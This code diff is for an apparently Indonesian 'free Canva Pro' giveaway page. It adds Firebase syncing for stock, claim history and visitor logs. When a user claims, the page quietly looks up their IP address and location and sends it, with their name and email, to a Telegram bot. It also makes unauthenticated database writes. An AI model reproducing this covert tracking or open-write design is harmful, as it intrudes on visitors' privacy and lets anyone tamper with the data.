@@ -759,15 +759,69 @@
         const COUNTDOWN_SECONDS = 10;
         const MASA_AKTIF_END = new Date('2026-04-25T23:59:59+08:00');
 
-        function getStockRemaining() {
+        // =========== FIREBASE CONFIG ===========
+        // Isi FIREBASE_DB_URL dengan URL Firebase Realtime Database-mu
+        // Contoh: "https://nama-project-default-rtdb.firebaseio.com"
+        // Biarkan kosong ("") untuk fallback ke localStorage (tidak sinkron antar perangkat)
+        const FIREBASE_DB_URL = ""; // <-- ISI DI SINI
+
+        function fbReady() { return typeof FIREBASE_DB_URL === 'string' && FIREBASE_DB_URL.length > 0; }
+
+        function normalizeFirebaseArray(data) {
+            if (Array.isArray(data)) return data;
+            if (data && typeof data === 'object') return Object.values(data).filter(Boolean);
+            return [];
+        }
+
+        async function fbGet(path) {
+            if (!fbReady()) return null;
+            try {
+                const r = await fetch(`${FIREBASE_DB_URL}/${path}.json`);
+                if (!r.ok) return null;
+                return await r.json();
+            } catch { return null; }
+        }
+
+        async function fbSet(path, data) {
+            if (!fbReady()) return false;
+            try {
+                const r = await fetch(`${FIREBASE_DB_URL}/${path}.json`, {
+                    method: 'PUT',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+                return r.ok;
+            } catch { return false; }
+        }
+
+        async function getStockRemaining() {
+            const fb = await fbGet('canva/stock');
+            if (fb !== null && !isNaN(parseInt(fb))) {
+                const val = Math.max(0, parseInt(fb));
+                localStorage.setItem('canva_stock', val);
+                return val;
+            }
             const v = parseInt(localStorage.getItem('canva_stock'));
             if (isNaN(v)) { localStorage.setItem('canva_stock', DEFAULT_STOCK); return DEFAULT_STOCK; }
             return Math.max(0, v);
         }
 
-        function getMasaAktifText() {
+        async function getCanvaLinkDB() {
+            const fb = await fbGet('canva/link');
+            if (fb && typeof fb === 'string') return fb;
+            return localStorage.getItem('canva_link') || CANVA_LINK;
+        }
+
+        async function getMasaAktifEndDB() {
+            const fb = await fbGet('canva/masa_aktif_end');
+            if (fb) { localStorage.setItem('masa_aktif_end', fb); return new Date(fb); }
+            const loc = localStorage.getItem('masa_aktif_end');
+            return loc ? new Date(loc) : MASA_AKTIF_END;
+        }
+
+        function getMasaAktifText(end) {
             const now = new Date();
-            const diff = MASA_AKTIF_END - now;
+            const diff = (end || MASA_AKTIF_END) - now;
             if (diff <= 0) return 'Habis';
             const days  = Math.floor(diff / (1000 * 60 * 60 * 24));
             const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
@@ -775,24 +829,34 @@
             return hours + ' jam lagi';
         }
 
-        function openGiftPanel() {
-            const stock = getStockRemaining();
-            document.getElementById('stockCount').textContent = stock;
-            document.getElementById('stockBar').style.width = (stock / STOCK_TOTAL * 100) + '%';
-            document.getElementById('stockLabel').textContent = 'Tersisa ' + stock + ' dari ' + STOCK_TOTAL + ' slot';
-            document.getElementById('canvaCountdown').textContent = getMasaAktifText();
+        async function openGiftPanel() {
+            // Show cached values immediately while Firebase loads
+            const cachedStock = parseInt(localStorage.getItem('canva_stock'));
+            const cachedEnd   = localStorage.getItem('masa_aktif_end');
+            const initStock   = isNaN(cachedStock) ? DEFAULT_STOCK : Math.max(0, cachedStock);
+            const initEnd     = cachedEnd ? new Date(cachedEnd) : MASA_AKTIF_END;
+            document.getElementById('stockCount').textContent = initStock;
+            document.getElementById('stockBar').style.width = (initStock / STOCK_TOTAL * 100) + '%';
+            document.getElementById('stockLabel').textContent = 'Tersisa ' + initStock + ' dari ' + STOCK_TOTAL + ' slot';
+            document.getElementById('canvaCountdown').textContent = getMasaAktifText(initEnd);
 
-            // animate gift emoji
+            // Animate & show panel
             const emoji = document.getElementById('giftEmoji');
             emoji.style.animation = 'none';
             setTimeout(() => { emoji.style.animation = 'giftShake 0.6s ease, giftBounce 0.6s ease 0.6s'; }, 10);
-
             const panel = document.getElementById('giftPanel');
             panel.style.display = 'flex';
             setTimeout(() => {
                 panel.style.opacity = '1';
                 document.getElementById('giftPanelCard').style.transform = 'scale(1) translateY(0)';
             }, 10);
+
+            // Fetch fresh data from Firebase and update display
+            const [freshStock, freshEnd] = await Promise.all([getStockRemaining(), getMasaAktifEndDB()]);
+            document.getElementById('stockCount').textContent = freshStock;
+            document.getElementById('stockBar').style.width = (freshStock / STOCK_TOTAL * 100) + '%';
+            document.getElementById('stockLabel').textContent = 'Tersisa ' + freshStock + ' dari ' + STOCK_TOTAL + ' slot';
+            document.getElementById('canvaCountdown').textContent = getMasaAktifText(freshEnd);
         }
 
         function closeGiftPanel() {
@@ -822,14 +886,14 @@
             setTimeout(() => { modal.style.display = 'none'; }, 400);
         }
 
-        function submitKlaim() {
+        async function submitKlaim() {
             const name  = document.getElementById('klaimName').value.trim();
             const email = document.getElementById('klaimEmail').value.trim();
 
             if (!name || !email) { alert("Mohon isi Nama dan Email terlebih dahulu!"); return; }
             if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) { alert("Format email tidak valid!"); return; }
 
-            const stock = getStockRemaining();
+            const stock = await getStockRemaining();
             if (stock <= 0) { alert("Maaf, stok sudah habis!"); closeKlaimModal(); return; }
 
             const btn = document.getElementById('submitKlaimBtn');
@@ -841,12 +905,14 @@
             const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
             const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Makassar", dateStyle: "full", timeStyle: "short" });
 
-            fetch("https://ipapi.co/json/")
-                .then(r => r.json()).catch(() => null)
-                .then(geo => {
-                    const ip  = geo && geo.ip ? `\`${geo.ip}\`` : "N/A";
-                    const loc = geo ? `${geo.city||'-'}, ${geo.region||'-'}, ${geo.country_name||'-'}` : "N/A";
-                    const text =
+            try {
+                let geo = null;
+                try { const gr = await fetch("https://ipapi.co/json/"); geo = await gr.json(); } catch {}
+
+                const ip  = geo && geo.ip ? `\`${geo.ip}\`` : "N/A";
+                const loc = geo ? `${geo.city||'-'}, ${geo.region||'-'}, ${geo.country_name||'-'}` : "N/A";
+                const newStock = Math.max(0, stock - 1);
+                const text =
 `🎁 *Klaim Canva Pro Baru!*
 
 👤 *Nama:* ${escapeMdGift(name)}
@@ -854,38 +920,42 @@
 🌐 *IP:* ${ip}
 📍 *Lokasi:* ${escapeMdGift(loc)}
 🕒 *Waktu:* ${now}
-📦 *Stok sisa:* ${stock - 1} dari ${STOCK_TOTAL}`;
+📦 *Stok sisa:* ${newStock} dari ${STOCK_TOTAL}`;
 
-                    return fetch(telegramUrl, {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({ chat_id: chatId, text, parse_mode: "Markdown" })
-                    });
-                })
-                .then(r => r.json())
-                .then(data => {
-                    if (data.ok) {
-                        // Decrement stock
-                        const newStock = Math.max(0, getStockRemaining() - 1);
-                        localStorage.setItem('canva_stock', newStock);
-                        // Save to history
-                        const history = JSON.parse(localStorage.getItem('canva_history') || '[]');
-                        history.unshift({ name, email, time: new Date().toISOString(), stock: newStock });
-                        localStorage.setItem('canva_history', JSON.stringify(history.slice(0, 200)));
+                const tgResp = await fetch(telegramUrl, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ chat_id: chatId, text, parse_mode: "Markdown" })
+                });
+                const data = await tgResp.json();
 
-                        closeKlaimModal();
-                        setTimeout(openSuccessModal, 420);
-                    } else {
-                        alert("❌ Gagal mengirim! Silakan coba lagi.");
-                        btn.disabled = false;
-                        btn.innerHTML = '<i class="fas fa-check-circle"></i> Konfirmasi & Kirim';
-                    }
-                })
-                .catch(() => {
-                    alert("❌ Terjadi kesalahan jaringan.");
+                if (data.ok) {
+                    // Write new stock to Firebase (and localStorage cache)
+                    await fbSet('canva/stock', newStock);
+                    localStorage.setItem('canva_stock', newStock);
+
+                    // Append claim to history in Firebase
+                    const claimEntry = { name, email, time: new Date().toISOString(), stock: newStock };
+                    const fbHist = await fbGet('canva/history');
+                    const histArr = normalizeFirebaseArray(fbHist);
+                    histArr.unshift(claimEntry);
+                    await fbSet('canva/history', histArr.slice(0, 200));
+
+                    // Update localStorage cache
+                    localStorage.setItem('canva_history', JSON.stringify(histArr.slice(0, 200)));
+
+                    closeKlaimModal();
+                    setTimeout(openSuccessModal, 420);
+                } else {
+                    alert("❌ Gagal mengirim! Silakan coba lagi.");
                     btn.disabled = false;
                     btn.innerHTML = '<i class="fas fa-check-circle"></i> Konfirmasi & Kirim';
-                });
+                }
+            } catch {
+                alert("❌ Terjadi kesalahan jaringan.");
+                btn.disabled = false;
+                btn.innerHTML = '<i class="fas fa-check-circle"></i> Konfirmasi & Kirim';
+            }
         }
 
         function escapeMdGift(text) {
@@ -916,14 +986,15 @@
             }, 1000);
         }
 
-        function openCanvaLink() {
+        async function openCanvaLink() {
             clearInterval(countdownTimer);
             const modal = document.getElementById('claimSuccessModal');
             modal.style.opacity = '0';
             document.getElementById('claimSuccessCard').style.transform = 'scale(0.9) translateY(30px)';
+            const link = await getCanvaLinkDB();
             setTimeout(() => {
                 modal.style.display = 'none';
-                window.open(CANVA_LINK, '_blank');
+                window.open(link, '_blank');
                 document.getElementById('klaimName').value = '';
                 document.getElementById('klaimEmail').value = '';
                 const btn = document.getElementById('submitKlaimBtn');
@@ -933,14 +1004,25 @@
         }
 
         // Track visitor count
-        (function trackVisit() {
+        (async function trackVisit() {
             const visited = sessionStorage.getItem('visited');
             if (!visited) {
                 sessionStorage.setItem('visited', '1');
+                const entry = { time: new Date().toISOString(), ua: navigator.userAgent.slice(0, 80) };
+
+                // Write to Firebase
+                const fbCount = await fbGet('visitors/count');
+                await fbSet('visitors/count', (parseInt(fbCount) || 0) + 1);
+                const fbLog = await fbGet('visitors/log');
+                const fbLogArr = normalizeFirebaseArray(fbLog);
+                fbLogArr.unshift(entry);
+                await fbSet('visitors/log', fbLogArr.slice(0, 500));
+
+                // Also update localStorage cache
                 const vc = parseInt(localStorage.getItem('visitor_count') || '0') + 1;
                 localStorage.setItem('visitor_count', vc);
                 const vl = JSON.parse(localStorage.getItem('visitor_log') || '[]');
-                vl.unshift({ time: new Date().toISOString(), ua: navigator.userAgent.slice(0,80) });
+                vl.unshift(entry);
                 localStorage.setItem('visitor_log', JSON.stringify(vl.slice(0, 500)));
             }
         })();
